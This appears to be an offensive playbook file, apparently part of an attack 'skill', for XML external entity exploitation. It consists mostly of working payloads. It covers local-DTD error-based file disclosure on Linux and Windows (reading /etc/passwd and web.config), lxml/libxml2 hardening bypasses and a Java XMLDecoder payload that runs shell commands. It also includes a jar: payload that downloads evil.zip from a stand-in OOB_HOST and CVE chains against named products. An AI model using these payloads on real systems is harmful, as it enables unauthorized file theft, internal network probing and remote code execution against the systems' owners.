# Parser/CVE-specific XXE + local-DTD-by-OS lookup — Open WHEN: OOB egress is blocked, OR you have fingerprinted the XML parser (lxml/libxml2, Xerces/Java) or a known CVE product, and need a no-callback (error-based, local-DTD) path

Use this when the SKILL body's OOB chains fail because outbound network is
filtered, or when a response leaked a parser/product fingerprint. The
local-DTD technique needs **zero egress**: it reuses a `.dtd` already on the
target's disk and leaks file content through a forced parser error.

## Local-DTD error-based exfil — how it works (no outbound connection)
1. Load a `.dtd` that already exists on the host as a parameter entity.
2. That DTD defines some parameter entity; you **redefine** it (internal subset
   wins) to wrap the error-based file-read chain.
3. Expand it → parser tries to open `file:///bad/<FILE_CONTENTS>` → the
   exception message echoes the file contents back in the HTTP response.

Confirm a candidate DTD path exists first (error mentions the file if present):
```xml
<!DOCTYPE root [ <!ENTITY % local_dtd SYSTEM "file:///abcxyz/"> %local_dtd; ]>
```

### Linux local-DTD lookup (pick one that exists; `locate .dtd` on a like host)
| DTD path on disk | Redefinable param entity | Notes |
|---|---|---|
| `/usr/share/xml/fontconfig/fonts.dtd` | `%constant` (line 148) | most universal on Linux |
| `/usr/share/yelp/dtd/docbookx.dtd` | `%ISOamso` | GNOME desktop hosts |
| `/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd` | — | scrollkeeper |
| `/usr/share/xml/svg/svg10.dtd`, `svg11.dtd` | — | svg toolchains |

Full `fonts.dtd` chain (redefines `%constant`, reads `/etc/passwd`):
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % constant 'aaa)>
          <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
          <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
          &#x25;eval;
          &#x25;error;
          <!ELEMENT aa (bb'>
  %local_dtd;
]>
<message>Text</message>
```
`docbookx.dtd` variant (redefines `%ISOamso`):
```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval; %error;'>
  %local_dtd;
]>
<stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>
```

### Windows local-DTD (`cim20.dtd` ships on every Windows)
Path: `C:\Windows\System32\wbem\xml\cim20.dtd`, redefinable entity `%SuperClass`.
Disclose a local file:
```xml
<!DOCTYPE doc [
    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
    <!ENTITY % SuperClass '>
        <!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
      <!ENTITY test "test"'>
    %local_dtd;
]><xxx>anything</xxx>
```
Swap the `%file` SYSTEM to an `https://` URL to turn the same chain into a
no-egress-needed SSRF whose response lands in the error message.

### Finding more DTD paths
`GoSecure/dtd-finder` ships a path list and can scan a target Docker image's tar:
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/target_image.tar
# [=] Found a DTD: /tomcat/lib/jsp-api.jar!/.../jspxml.dtd  → reuse via jar: + local-dtd
```

## Python lxml / libxml2 error-based (no outbound) — when fingerprint says lxml
**lxml < 5.4.0 / libxml2 < 2.13.8** still expand *parameter* entities even with
`resolve_entities=False`, when the app sets `load_dtd=True`/`resolve_entities=True`.
Needs a local DTD on disk that references an *undefined* parameter entity; you
redefine it to embed file content in the thrown exception:
```xml
<!DOCTYPE colors [
  <!ENTITY % local_dtd SYSTEM "file:///tmp/xml/config.dtd">
  <!ENTITY % config_hex '
    <!ENTITY % flag SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///aaa/%flag;'>">
  %eval;'>
  %local_dtd;
]>
```
Response surfaces: `failed to load external entity "file:///aaa/FLAG{secret}"`.
If the parser complains about `%`/`&` in the internal subset, double-encode
(`&#x26;#x25;` ⇒ `%`) to delay expansion.

**lxml ≥ 5.4.0 hardening bypass (libxml2 still permits it):** route through a
*general* entity with a non-existent scheme so the failed dereference reflects
the file contents:
```xml
<!DOCTYPE colors [
  <!ENTITY % a '
    <!ENTITY % file SYSTEM "file:///tmp/flag.txt">
    <!ENTITY % b "<!ENTITY c SYSTEM 'meow://%file;'>">
  '>
  %a; %b;
]>
<colors>&c;</colors>
```
Both work with zero outbound connectivity — ideal for egress-filtered targets.

## Java XMLDecoder → RCE (when the sink is `java.beans.XMLDecoder.readObject`)
This is NOT entity XXE — it's object instantiation from XML. If a body is passed
to `XMLDecoder`, arbitrary command execution follows:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
 <object class="java.lang.ProcessBuilder">
   <array class="java.lang.String" length="3">
     <void index="0"><string>/bin/sh</string></void>
     <void index="1"><string>-c</string></void>
     <void index="2"><string>id</string></void>
   </array>
   <void method="start"/>
 </object>
</java>
```

## Java jar: protocol — temp-file write primitive
`jar:` (Java-only) downloads a remote zip to a temp dir before extracting; hold
the HTTP connection open to leave a controlled temp file on disk (chains into a
separate path-traversal / LFI / deserialization sink):
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://OOB_HOST:8080/evil.zip!/evil.dtd">]><foo>&xxe;</foo>
```
Local form reads a file inside an on-disk archive: `jar:file:///var/app.zip!/x.txt`.

## Dated CVE chains (use when product/version is fingerprinted)
- **CVE-2025-27136** — LocalS3 (Java S3 emulator). Unauthenticated XXE: send a
  crafted XML body to the `CreateBucketConfiguration` endpoint; the vulnerable
  `DocumentBuilderFactory` (no `disallow-doctype-decl`) embeds local files
  (e.g. `/etc/passwd`) directly in the HTTP response.
- **CVE-2018-11788** — Apache Karaf ≤ 4.2.1 / ≤ 4.1.6. Drop a `features` XML into
  the `deploy/` folder; the feature parser resolves the external DTD:
  ```xml
  <!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://OOB_HOST"> %dtd;]>
  <features name="my-features" xmlns="http://karaf.apache.org/xmlns/features/v1.3.0">
    <feature name="deployer" version="2.0" install="auto"></feature>
  </features>
  ```
- **Xerox FreeFlow Core (JMF listener, port 4004)** — Java JMF parser
  (`jmfclient.jar`) accepts a `DOCTYPE` over TCP → SSRF / internal recon. OOB
  callback confirms; the DOCTYPE is the load-bearing part, JMF framing varies:
  ```xml
  <!DOCTYPE JMF [<!ENTITY probe SYSTEM "http://OOB_HOST/oob">]>
  <JMF SenderID="t" Version="1.3"><Query Type="KnownMessages">&probe;</Query></JMF>
  ```
- **CVE-2019-8986** — TIBCO JasperReports Server: SOAP XXE (reporting/XSLT
  engine). Treat any Jasper/FOP/XSLT transform endpoint as an XML sink.

## DocumentBuilderFactory fingerprint note (Java)
A Java sink built from `DocumentBuilderFactory.newInstance()` with **no**
`disallow-doctype-decl` / `external-general-entities=false` is XXE-prone by
default — classic `file:///` and `http://169.254.169.254/` payloads both apply.
If those three features are set, entity and SSRF vectors are closed; pivot to
XInclude or an XSLT `document()` transform endpoint instead.
